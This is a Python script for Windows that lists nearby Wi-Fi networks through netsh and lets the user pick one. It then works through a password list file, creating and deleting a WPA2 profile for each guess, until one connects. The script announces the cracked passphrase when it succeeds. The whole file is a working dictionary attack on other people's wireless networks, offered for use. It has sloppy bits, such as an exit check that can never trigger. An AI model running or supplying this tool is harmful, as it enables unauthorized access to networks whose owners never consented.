import subprocess

def fetch_wifi_names():
    wifi_list = []
    
    # Run the command to get the list of Wi-Fi networks
    command_output = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True, text=True).stdout
    
    # Split the output by lines
    lines = command_output.split('\n')
    
    # Loop through each line and find the SSID lines
    for line in lines:
        if "SSID" in line:
            # Extract the SSID name and add to the list
            ssid_name = line.split(":")[1].strip()
            if ssid_name:
                wifi_list.append(ssid_name)
    
    return wifi_list

def main():
    wifi_names = fetch_wifi_names()
    
    # Save the Wi-Fi names to a file
    with open("wifi_names.txt", "w") as file:
        for i, wifi in enumerate(wifi_names, start=1):

            file.write(f"{i}. {wifi}\n")
    
    # Print the Wi-Fi names
    print("____Press Z For EXIT_____")
    print("Available Wi-Fi Networks:")
    for i, wifi in enumerate(wifi_names, start=1):
        print(f"{i}. {wifi}")
    
    # Prompt the user to select a Wi-Fi network
    while True:
        try:
            choice = int(input("Select a Wi-Fi:  "))
            
            if(choice == 'z'):
                exit()

            elif 1 <= choice <= len(wifi_names):
                print(f"You selected: {wifi_names[choice - 1]}")

                import subprocess
                import time
                import os
                def is_connected_to_ssid(target_ssid):
                    """
                    Checks if the system is currently connected to the target SSID.
                    """
                    try:
                        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
                        output = result.stdout.lower()
                        
                        if 'state' in output and 'connected' in output:
                            lines = output.splitlines()
                            for i in range(len(lines)):
                                if 'state' in lines[i]:
                                    if 'connected' in lines[i]:
                                        # Look for SSID in the subsequent lines
                                        for j in range(i, i+5):  # Checking the next 5 lines for SSID
                                            if 'ssid' in lines[j]:
                                                connected_ssid = lines[j].split(':')[1].strip()
                                                if connected_ssid.lower() == target_ssid.lower():
                                                    return True
                        return False
                    except Exception as e:
                        print(f"Error checking connection status: {e}")
                        return False

                def connect_to_wifi(ssid, password):
                    profile = f'''<?xml version="1.0" encoding="UTF-8"?>
                <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                    <name>{ssid}</name>
                    <SSIDConfig>
                        <SSID>
                            <name>{ssid}</name>
                        </SSID>
                    </SSIDConfig>
                    <connectionType>ESS</connectionType>
                    <connectionMode>auto</connectionMode>
                    <MSM>
                        <security>
                            <authEncryption>
                                <authentication>WPA2PSK</authentication>
                                <encryption>AES</encryption>
                                <useOneX>false</useOneX>
                            </authEncryption>
                            <sharedKey>
                                <keyType>passPhrase</keyType>
                                <protected>false</protected>
                                <keyMaterial>{password}</keyMaterial>
                            </sharedKey>
                        </security>
                    </MSM>
                </WLANProfile>
                '''
                    try:
                        # Write the profile to an XML file
                        with open(f'{ssid}.xml', 'w') as file:
                            file.write(profile)
                        
                        # Add the profile
                        add_profile = subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={ssid}.xml'], capture_output=True, text=True)
                        if add_profile.returncode != 0:
                            print(f"Failed to add profile for SSID {ssid}. Error: {add_profile.stderr.strip()}")
                            return False

                        # Attempt to connect
                        # print(f"Attempting to connect to {ssid} with password: {password}")
                        connect = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], capture_output=True, text=True)
                        if connect.returncode != 0:
                            print(f"Connection command failed. Error: {connect.stderr.strip()}")
                            # return False
                            exit()

                        # Wait and check connection status periodically
                        timeout = 1  # Total time to wait (in seconds)
                        interval = 1  # Interval between checks (in seconds)
                        elapsed = 0

                        while elapsed < timeout:
                            time.sleep(interval)
                            if is_connected_to_ssid(ssid):
                                print(f"\033[92mSuccessfully connected to {ssid} with password: {password}\033[0m")
                                return True
                            elapsed += interval

                        # print(f"Failed to connect to {ssid} within the timeout period.")
                        print(f"\033[91mFailed to connect to {ssid} password = {password}\033[0m")
                        return False

                    except Exception as e:
                        print(f"An error occurred: {e}")
                        return False
                    finally:
                        # Clean up the profile file
                        try:
                            subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'], capture_output=True)
                            os.remove(f'{ssid}.xml')
                        except:
                            pass

                def try_passwords_from_file(ssid, filename):
                    try:
                        with open(filename, 'r') as file:
                            passwords = [line.strip() for line in file if line.strip()]
                    except FileNotFoundError:
                        print(f"The password file '{filename}' was not found.")
                        return

                    for password in passwords:
                        if connect_to_wifi(ssid, password):
                            print(f"\033[92mPassword Founded: {password}\033[0m")
                            return
                        # else:
                        #     print(f"Password '{password}' did not work. Trying next...")
                    print("Failed to connect with all passwords.")

                # Usage
                if __name__ == "__main__":
                    ssid = f'{wifi_names[choice - 1]}'  # Replace with your target SSID
                    password_file = 'password_list.txt'  # Ensure this file exists in the same directory
                    try_passwords_from_file(ssid, password_file)







                break
            else:
                print(f"Please enter a number between 1 and {len(wifi_names)}.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

if __name__ == "__main__":
    main()
